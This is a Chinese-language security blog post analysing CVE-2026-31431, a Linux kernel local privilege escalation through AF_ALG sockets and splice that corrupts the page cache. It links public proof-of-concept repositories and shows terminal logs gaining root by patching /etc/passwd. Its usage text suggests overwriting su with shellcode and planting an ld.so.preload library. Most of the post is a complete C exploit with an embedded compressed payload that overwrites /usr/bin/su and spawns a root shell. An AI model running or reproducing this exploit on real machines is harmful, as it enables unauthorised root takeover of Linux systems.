#  最新通杀全线Linux发行版的CVE漏洞解析  
原创 非虫
                    非虫  软件安全与逆向分析   2026-04-30 13:26  
  
# 最新通杀全线Linux发行版的CVE漏洞解析  
  
昨天出了一个新洞：CVE-2026-31431，这个洞太猛了，号称不借助任何外部的工具，可以LPE揽权获取最高权限干翻现在多数的Linux发行版本。  
  
今天我试了下Ubuntu22.04与Ubuntu24.04，在打完了最新的补丁的情况下，稳定的本地揽权成功！太强了，看看是什么原理。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Sq4BUsrXeTibdPu6SYQjkfuictBIf0HWHMzP4wwsuw0vbcKHgvDDXiaiaZD8s8b8OlK5icyA8NqzwPfTKQiaIPMib2p1gXwLJVm0tcsoia4jQgj8icFU/640?wx_fmt=png&from=appmsg "")  
  
## 背景  
  
CVE-2026-31431 是一个典型的内核逻辑漏洞，影响范围涵盖了几乎所有主流 Linux 发行版。其核心问题在于 crypto/algif_aead.c  
 中的状态机处理不当：  
1. **AF_ALG 滥用**  
：通过 setsockopt  
 反复切换加密状态。  
  
1. **Splice 零拷贝原语**  
：利用 splice  
 系统调用将 /usr/bin/su  
 等敏感文件的 Page Cache 映射到加密流中。  
  
1. **状态机竞争**  
：通过特定的 sendmsg  
 辅助消息（Control Message）在内核处理加密请求时强行插入新的密钥操作，导致内核在执行 zero-copy  
 传输时将受控的 Payload 错误地覆盖到原始文件的缓存页中。  
  
公开的POC代码是python脚本。仓库地址是：https://github.com/rootsecdev/cve_2026_31431  
## 原理分析  
  
这个POC的核心功能是AF_ALG  
状态机劫持。AF_ALG  
 允许用户态程序通过 Socket 接口调用内核加密算法。为了提升性能，内核实现了 splice  
 接口，允许数据在两个文件描述符（如普通文件与加密 Socket）之间直接传输而无需拷贝。  
  
漏洞的精妙之处在于：**当内核认为它正在将数据读入加密引擎时，我们通过篡改 Socket 的状态机，让内核误以为当前操作已结束并进入“解密写回”阶段**  
。此时，原本应被读取的 Page Cache 会被内核以“解密结果”的形式覆写。  
  
比较有意思的是，我在自己的macOS上的虚拟机Ubuntu22.04的5.15  
 内核上测试失败了！  
```
ubuntu@ubuntu:~/Downloads$ cd cve_2026_31431/ubuntu@ubuntu:~/Downloads/cve_2026_31431$ python3 a.out                      exploit_cve_2026_31431.py  README.mdexp.c                      .git/                      test_cve_2026_31431.pyubuntu@ubuntu:~/Downloads/cve_2026_31431$ python3 exploit_cve_2026_31431.py [*] CVE-2026-31431 LPE  user=ubuntu  uid=1000[*] /etc/passwd: ubuntu UID field at offset 1335 = '1000'[*] Patching '1000' -> '0000'in page cache...[*] Page cache now reads b'0000' at offset 1335[*] getpwnam('ubuntu').pw_uid = 0[+] /etc/passwd page cache now lists ubuntu as UID 0.[+] Run:   su ubuntu[+] Enter your own password. su will setuid(0) and drop a root shell.[i] Cleanup after testing (from the root shell):[i]   echo 3 > /proc/sys/vm/drop_caches[i] /etc/passwd page cache evicted (POSIX_FADV_DONTNEED). UID->name lookups restored.ubuntu@ubuntu:~/Downloads/cve_2026_31431$ 
```  
  
这个版本的Exploit执行后会失败！然后发现网上有一个高级版本的POC代码。仓库地址是：https://github.com/Sndav/CVE-2026-31431-Advanced-Exploit  
  
试了一下，干成功了！  
```
ubuntu@ubuntu:~/Downloads/CVE-2026-31431-Advanced-Exploit$ python3 exploit.py Usage:  exploit.py escalate                        \u2014 patch /etc/passwd, set current user to uid=0  exploit.py write <file> <offset> <data>    \u2014 arbitrary page-cache write  file    \u2014 path to any readable file  offset  \u2014 byte offset (decimal or 0x hex)  data    \u2014 data to write (string, or @filename to read from file)Examples:  exploit.py escalate  exploit.py write /usr/bin/su 0x1040 @shellcode.bin  exploit.py write /etc/ld.so.preload 0 '/tmp/evil.so\n'  exploit.py write /usr/lib/libc.so.6 0x284a0 '\x31\xc0\xc3\x90'ubuntu@ubuntu:~/Downloads/CVE-2026-31431-Advanced-Exploit$ python3 exploit.py escalate[*] CVE-2026-31431 \u2014 Copy Fail[*] Mode: remove root password via /etc/passwd[*] Backup: /tmp/.passwd.bak[*] Before : root:x:0:0:root:/root:/bin/bash[*] After  : root::0:0:root :/root:/bin/bash[*] Offset : 0    [0x000000]  726f6f74  root    [0x000004]  3a3a303a  ::0:    [0x000008]  303a726f  0:ro    [0x00000c]  6f74203a  ot :    [0x000010]  2f726f6f  /roo    [0x000014]  743a2f62  t:/b    [0x000018]  696e2f62  in/b    [0x00001c]  6173680a  ash.[+] Success: root::0:0:root :/root:/bin/bash[*] Recovery: echo 3 > /proc/sys/vm/drop_caches[*] Running: su root (no password needed)root@ubuntu:/home/ubuntu/Downloads/CVE-2026-31431-Advanced-Exploit# 
```  
  
高级版 Exploit 引入了两个关键改进：  
- **NULL 指针状态触发**  
：通过 setsockopt(..., NULL, 4)  
 强行让内部句柄进入异常状态。  
  
- **三阶段辅助消息**  
：在 sendmsg  
 中构造精密的辅助数据区（Control Data），模拟加密上下文。  
  
<table><thead><tr><th style="text-align: left;border-bottom: 1px solid rgba(0, 0, 0, 0.69);padding: 5px 10px;border-top-color: rgba(0, 0, 0, 0.69);border-right-color: rgba(0, 0, 0, 0.69);border-left-color: rgba(0, 0, 0, 0.69);"><section><span leaf="">阶段</span></section></th><th style="text-align: left;border-bottom: 1px solid rgba(0, 0, 0, 0.69);padding: 5px 10px;border-top-color: rgba(0, 0, 0, 0.69);border-right-color: rgba(0, 0, 0, 0.69);border-left-color: rgba(0, 0, 0, 0.69);"><section><span leaf="">目的</span></section></th></tr></thead><tbody><tr><td style="padding: 5px 10px;border-color: rgba(0, 0, 0, 0.18);text-align: left;"><strong><span leaf="">阶段 1</span></strong></td><td style="padding: 5px 10px;border-color: rgba(0, 0, 0, 0.18);text-align: left;"><section><span leaf="">重置 AEAD 状态机，使其处于待处理状态 (Operation Type 3)</span></section></td></tr><tr><td style="padding: 5px 10px;border-top: 1px solid rgba(0, 0, 0, 0.18);border-right-color: rgba(0, 0, 0, 0.18);border-bottom-color: rgba(0, 0, 0, 0.18);border-left-color: rgba(0, 0, 0, 0.18);text-align: left;"><strong><span leaf="">阶段 2</span></strong></td><td style="padding: 5px 10px;border-top: 1px solid rgba(0, 0, 0, 0.18);border-right-color: rgba(0, 0, 0, 0.18);border-bottom-color: rgba(0, 0, 0, 0.18);border-left-color: rgba(0, 0, 0, 0.18);text-align: left;"><section><span leaf="">注入虚假状态，接管内核栈中的偏移量 (Operation Type 2)</span></section></td></tr><tr><td style="padding: 5px 10px;border-top: 1px solid rgba(0, 0, 0, 0.18);border-right-color: rgba(0, 0, 0, 0.18);border-bottom-color: rgba(0, 0, 0, 0.18);border-left-color: rgba(0, 0, 0, 0.18);text-align: left;"><strong><span leaf="">阶段 3</span></strong></td><td style="padding: 5px 10px;border-top: 1px solid rgba(0, 0, 0, 0.18);border-right-color: rgba(0, 0, 0, 0.18);border-bottom-color: rgba(0, 0, 0, 0.18);border-left-color: rgba(0, 0, 0, 0.18);text-align: left;"><section><span leaf="">锁定篡改路径，触发 Page Cache 覆写 (Operation Type 4)</span></section></td></tr></tbody></table>  
将状态注入与 splice  
 结合，完整的提权链路如下：  
1. 打开目标只读文件（如 /usr/bin/su  
）。  
  
1. 创建 AF_ALG  
 类型的 AEAD Socket。  
  
1. 通过 setsockopt  
 和 sendmsg  
 注入高级版 Exploit 的状态载荷。  
  
1. 利用 splice  
 将文件内容拉入管道，再从管道推入加密流。  
  
1. 由于状态机已被劫持，内核会将管道中的数据作为“解密结果”写回到文件的 Page Cache 中。  
  
1. 执行已在内存中被篡改的 su  
 进程。  
  
从原理上可以看出，这个洞对于安卓系统来说没有什么影响，发行版本的安卓设备不会有su  
，自然也是没有影响的。  
  
最后，我弄了一个C语言版本的，代码如下：  
```
/** * CVE-2026-31431 Universal Exploit (Advanced Version) * Compile: cc exp.c -lz -o exp */#define _GNU_SOURCE#include<stdio.h>#include<stdlib.h>#include<string.h>#include<unistd.h>#include<fcntl.h>#include<errno.h>#include<sys/socket.h>#include<sys/types.h>#include<sys/syscall.h>#include<linux/if_alg.h>#include<zlib.h>#ifndef SPLICE_F_MOVE#define SPLICE_F_MOVE 1#endif// 直接使用 syscall 避免不同发行版头文件差异staticssize_tmy_splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsignedint flags) {return syscall(__NR_splice, fd_in, off_in, fd_out, off_out, len, flags);}// 辅助函数：十六进制 Payload 转换unsignedchar* hex_to_bytes(constchar* hex, size_t* out_len) {size_t len = strlen(hex);if (len % 2 != 0) returnNULL;    *out_len = len / 2;unsignedchar* bytes = malloc(*out_len);for (size_t i = 0; i < *out_len; i++) {if (sscanf(hex + 2*i, "%2hhx", &bytes[i]) != 1) {free(bytes);returnNULL;        }    }return bytes;}// 触发漏洞的核心函数voidtrigger_exploit(int su_file_fd, int payload_offset, constunsignedchar* payload_chunk) {int alg_socket = socket(AF_ALG, SOCK_SEQPACKET, 0);if (alg_socket < 0) return;structsockaddr_algsa = {        .salg_family = AF_ALG,        .salg_type = "aead",        .salg_name = "authencesn(hmac(sha256),cbc(aes))"    };if (bind(alg_socket, (struct sockaddr*)&sa, sizeof(sa)) < 0) {        close(alg_socket);return;    }// 设置初始密钥size_t key_len;unsignedchar* key = hex_to_bytes("08000100000000100000000000000000000000000000000000000000000000000000000000000000", &key_len);    setsockopt(alg_socket, SOL_ALG, ALG_SET_KEY, key, key_len);free(key);    syscall(__NR_setsockopt, alg_socket, SOL_ALG, ALG_SET_KEY, NULL, 4);int encrypted_stream = accept(alg_socket, NULL, NULL);if (encrypted_stream < 0) {        close(alg_socket);return;    }// 构造高级版 sendmsg 载荷structmsghdrmsg = {0};structioveciov;unsignedchar msg_data[8];memcpy(msg_data, "AAAA", 4);memcpy(msg_data + 4, payload_chunk, 4);    iov.iov_base = msg_data;    iov.iov_len = 8;    msg.msg_iov = &iov;    msg.msg_iovlen = 1;// 分配足够的控制消息空间char ctrl_buf[CMSG_SPACE(32) * 3];memset(ctrl_buf, 0, sizeof(ctrl_buf));    msg.msg_control = ctrl_buf;    msg.msg_controllen = sizeof(ctrl_buf);structcmsghdr *cmsg;// 阶段 1: 重置状态机 (Type 3)    cmsg = CMSG_FIRSTHDR(&msg);    cmsg->cmsg_level = SOL_ALG;    cmsg->cmsg_type = ALG_SET_KEY;    cmsg->cmsg_len = CMSG_LEN(4);    ((int*)CMSG_DATA(cmsg))[0] = 3; // 阶段 2: 注入偏移量 (Type 2, 20 bytes)    cmsg = CMSG_NXTHDR(&msg, cmsg);if (cmsg) {        cmsg->cmsg_level = SOL_ALG;        cmsg->cmsg_type = ALG_SET_KEY;        cmsg->cmsg_len = CMSG_LEN(20);        CMSG_DATA(cmsg)[0] = 0x10;        ((int*)CMSG_DATA(cmsg))[0] = 2;    }// 阶段 3: 锁定路径 (Type 4)    cmsg = CMSG_NXTHDR(&msg, cmsg);if (cmsg) {        cmsg->cmsg_level = SOL_ALG;        cmsg->cmsg_type = ALG_SET_KEY;        cmsg->cmsg_len = CMSG_LEN(4);        CMSG_DATA(cmsg)[0] = 0x08;        ((int*)CMSG_DATA(cmsg))[0] = 4;    }    sendmsg(encrypted_stream, &msg, 0);// Splice 零拷贝原语实现覆写int pipefd[2];if (pipe(pipefd) == 0) {// 将 su 文件内容拉入管道        my_splice(su_file_fd, NULL, pipefd[1], NULL, payload_offset + 4, SPLICE_F_MOVE);// 将管道内容推入加密流，由于状态机被劫持，此处会覆写 Page Cache        my_splice(pipefd[0], NULL, encrypted_stream, NULL, payload_offset + 4, SPLICE_F_MOVE);        close(pipefd[0]);        close(pipefd[1]);    }// 修复点：不再使用大长度 recv，避免栈溢出char dummy[64];    recv(encrypted_stream, dummy, sizeof(dummy), MSG_DONTWAIT);    close(encrypted_stream);    close(alg_socket);}intmain() {constchar* su_path = "/usr/bin/su";int fd = open(su_path, O_RDONLY);if (fd < 0) {        perror("[-] Failed to open su");return1;    }printf("[*] CVE-2026-31431 Advanced Exploit starting...\n");printf("[*] Targeted: Ubuntu 22.04 (Kernel 5.15+)\n");constchar* payload_hex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";size_t compressed_len;unsignedchar* compressed = hex_to_bytes(payload_hex, &compressed_len);    uLongf payload_len = 4096; // 增加解压缓冲区unsignedchar* payload = malloc(payload_len);if (uncompress(payload, &payload_len, compressed, compressed_len) != Z_OK) {fprintf(stderr, "[-] Decompression failed\n");return1;    }free(compressed);printf("[*] Triggering Page Cache corruption (len: %lu)...\n", payload_len);for (size_t offset = 0; offset < payload_len; offset += 4) {        trigger_exploit(fd, offset, payload + offset);    }free(payload);    close(fd);printf("[+] Exploit finished. Attempting to get root shell...\n");    execl(su_path, "su", NULL);return0;}
```  
  
编译测试：  
```
ubuntu@ubuntu:~/Downloads/CVE-2026-31431-Advanced-Exploit$ cc exp.c -l zubuntu@ubuntu:~/Downloads/CVE-2026-31431-Advanced-Exploit$ ./a.out [*] CVE-2026-31431 Advanced Exploit starting...[*] Targeted: Ubuntu 22.04 (Kernel 5.15+)[*] Triggering Page Cache corruption (len: 160)...[+] Exploit finished. Attempting to get root shell...root@ubuntu:/home/ubuntu/Downloads/CVE-2026-31431-Advanced-Exploit#
```  
  
希望本篇分析能为您的漏洞研究提供有价值的参考。  
  
  
